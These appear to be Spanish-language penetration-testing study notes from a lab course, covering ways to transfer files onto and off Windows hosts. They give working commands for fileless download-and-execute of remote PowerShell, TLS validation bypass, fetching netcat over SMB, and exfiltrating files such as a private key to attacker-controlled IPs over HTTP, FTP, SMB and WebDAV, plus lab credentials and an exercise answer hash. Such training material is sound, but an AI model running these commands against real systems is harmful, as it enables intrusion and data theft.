## Windows File Transfer Methods

### Descarga de Archivos
**PowerShell Base64 Encode & Decode**
```
#Linux Origen
md5sum id_rsa
cat id_rsa | base64 -w 0; echo

#Windows Destino
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("<cadena_base64>"))
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5

#Es util para payloads pequeños: CMD máx. 8191 caracteres.
```
**PowerShell Web Downloads**

```
#WebClient – File Download (Descarga normal de archivos ya que normalmente el https no es bloqueado en las organizaciones)
(New-Object Net.WebClient).DownloadFile('https://url/file.ps1','C:\Users\Public\file.ps1')
(New-Object Net.WebClient).DownloadFileAsync('https://url/file.ps1','C:\Users\Public\file.ps1')

#WebClient – Fileless (IEX) (Se ejecuta el archivo directamente en memoria, es decir no se almacena)
IEX (New-Object Net.WebClient).DownloadString('https://url/script.ps1')
(New-Object Net.WebClient).DownloadString('https://url/script.ps1') | IEX

#Invoke-WebRequest (iwr, curl, wget) (Bypass de descarga de archivos en caso de bloqueo)
Invoke-WebRequest https://url/file.ps1 -OutFile file.ps1
Invoke-WebRequest https://ip/file.ps1 -UseBasicParsing | IEX

#Bypass SSL/TLS (Por si no se tienen certificados validos)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads
```
#Iniciar servidor SMB
sudo impacket-smbserver share -smb2support /tmp/smbshare

#Copia de archivos con windows
copy \\192.168.220.133\share\nc.exe

#Bypass de bloqueo de invitados - Agregandole conexion con credenciales
sudo impacket-smbserver share -smb2support /tmp/smbshare -user User -password Password

net use n: \\192.168.220.133\share /user:User Password
copy n:\nc.exe

```

### FTP Downloads

```
#Crear servidor FTP
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21

#PowerShell Victima Windos
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt','C:\Users\Public\ftp-file.txt')

#Aveces es posible encontrarnos una Shell no interactiva, para ejecutar comandos en estos casos se hace lo siguiente
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt  #-v Verbose, -n Evita conexion automatica con servidor -s:ftpcommand.txt Ejecuta los comandos almacenados
```

### Carga de Archivos (Upload)
**PowerShell Base64 Encode & Decode**
```
#Windows (encode y hash):
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5

#Linux (decode y verificación):
echo <cadena_base64> | base64 -d > hosts
md5sum hosts
```
**PowerShell Web Uploads**
```
#Crear servidor de carga de archivos en "http://<ip>:8000/upload"
pip3 install uploadserver
python3 -m uploadserver

#Windows (PowerShell, subir archivo):
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

#PowerShell Web Uploads en Base 64
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64

#Captura con linux
nc -lvnp 8000
echo <base64> | base64 -d -w 0 > hosts
```
**SMB Upload a Windows**
```
#Iniciar servidor SMB en linux
impacket-smbserver sharefolder /tmp -smb2support
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```

**SMB Uploads con WebDav**
```
#Iniciar servidor WebDav
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

#Listar y subir archivos a WebDav
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\DavWWWRoot\  #Origen por defecto (Si no se especifica se accede a DavWWWRoot)
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.128\sharefolder\
```
**FTP Uploads**
```
#Servidor FTP con escritura
sudo python3 -m pyftpdlib --port 21 --write

#Conexion desde Windows
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts','C:\Windows\System32\drivers\etc\hosts')

#Windows cliente No Interactivo
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
**Solucion prueba**
```
xfreerdp3 /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.114.10:338

#Se crea el servidor SMB y un directorio llamado "share" compartiendo el directorio actual
sudo impacket-smbserver share -smb2support .

#En PowerShell se copia el archivo compartido
copy \\10.10.16.13\share\upload_win.zip

#Luego se extrae el .txt y se ejecuta hasher
hasher upload_win.txt
f458303ea783c224c6b4e7ef7f17eb9d 
```

____________________________________________________________________________________________________________________
